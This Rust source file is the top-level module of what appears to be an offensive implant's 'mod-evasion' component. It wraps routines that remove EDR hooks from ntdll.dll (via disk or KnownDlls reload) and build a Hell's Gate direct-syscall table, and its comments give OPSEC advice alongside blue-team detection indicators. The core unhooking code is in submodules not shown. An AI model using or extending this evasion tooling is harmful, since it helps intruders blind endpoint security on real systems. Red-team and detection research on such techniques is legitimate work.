//! ntdll unhooking module for mod-evasion
//!
//! Provides multiple techniques to remove EDR inline hooks from ntdll.dll:
//! - Disk: Load fresh ntdll from C:\Windows\System32\ntdll.dll
//! - KnownDlls: Load from \KnownDlls section (no disk access)
//! - Syscall: Extract syscall numbers for direct invocation (Hell's Gate)
//!
//! ## OPSEC Considerations
//! - Disk method leaves file access artifacts
//! - KnownDlls is stealthier (no file access)
//! - Syscall extraction doesn't modify ntdll
//!
//! ## Detection (Blue Team)
//! - File access to ntdll.dll from non-system process
//! - Opening \KnownDlls\ntdll.dll section
//! - VirtualProtect on ntdll .text section
//! - Memory permission changes on ntdll

pub mod pe;

#[cfg(target_os = "windows")]
pub mod disk;

#[cfg(target_os = "windows")]
pub mod knowndlls;

#[cfg(target_os = "windows")]
pub mod syscall;

use common::KrakenError;

/// Result of an unhooking operation
#[derive(Debug, Clone)]
pub struct UnhookResult {
    /// Method used for unhooking
    pub method: String,
    /// Whether the operation succeeded
    pub success: bool,
    /// Number of bytes restored (0 if using syscall method)
    pub bytes_restored: usize,
    /// Additional details
    pub message: String,
}

/// Unhook ntdll using the best available method
/// Tries KnownDlls first (no disk access), falls back to disk
#[cfg(target_os = "windows")]
pub fn unhook_ntdll() -> Result<UnhookResult, KrakenError> {
    // Try KnownDlls first (stealthier)
    match knowndlls::unhook_from_knowndlls() {
        Ok(result) => return Ok(result),
        Err(_) => {
            // Fall back to disk method
            disk::unhook_from_disk()
        }
    }
}

#[cfg(not(target_os = "windows"))]
pub fn unhook_ntdll() -> Result<UnhookResult, KrakenError> {
    Err(KrakenError::Module(
        "ntdll unhooking is only supported on Windows".into(),
    ))
}

/// Unhook ntdll specifically from disk
#[cfg(target_os = "windows")]
pub fn unhook_ntdll_disk() -> Result<UnhookResult, KrakenError> {
    disk::unhook_from_disk()
}

#[cfg(not(target_os = "windows"))]
pub fn unhook_ntdll_disk() -> Result<UnhookResult, KrakenError> {
    Err(KrakenError::Module(
        "ntdll unhooking is only supported on Windows".into(),
    ))
}

/// Unhook ntdll specifically from KnownDlls
#[cfg(target_os = "windows")]
pub fn unhook_ntdll_knowndlls() -> Result<UnhookResult, KrakenError> {
    knowndlls::unhook_from_knowndlls()
}

#[cfg(not(target_os = "windows"))]
pub fn unhook_ntdll_knowndlls() -> Result<UnhookResult, KrakenError> {
    Err(KrakenError::Module(
        "ntdll unhooking is only supported on Windows".into(),
    ))
}

/// Build a syscall table for direct invocation
#[cfg(target_os = "windows")]
pub fn build_syscall_table() -> Result<syscall::SyscallTable, KrakenError> {
    syscall::SyscallTable::build()
}

#[cfg(not(target_os = "windows"))]
pub fn build_syscall_table() -> Result<(), KrakenError> {
    Err(KrakenError::Module(
        "syscall table is only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_unhook_result() {
        let result = UnhookResult {
            method: "test".into(),
            success: true,
            bytes_restored: 1024,
            message: "test message".into(),
        };
        assert!(result.success);
        assert_eq!(result.bytes_restored, 1024);
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn test_unhook_fails_on_non_windows() {
        let result = unhook_ntdll();
        assert!(result.is_err());
    }
}
